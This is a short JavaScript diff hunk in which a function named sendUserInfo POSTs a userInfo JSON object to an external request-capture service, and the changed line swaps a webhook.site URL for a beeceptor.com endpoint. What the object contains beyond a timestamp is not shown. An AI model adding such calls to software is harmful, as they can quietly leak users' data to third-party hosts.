@@ -17,7 +17,7 @@ async function sendUserInfo() {
       timestamp: new Date().toISOString()
     };
 
-    await fetch('https://webhook.site/40d2e943-ae38-444d-bd8e-a912f859911a', {
+    await fetch('https://bbbb53.free.beeceptor.com', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(userInfo)
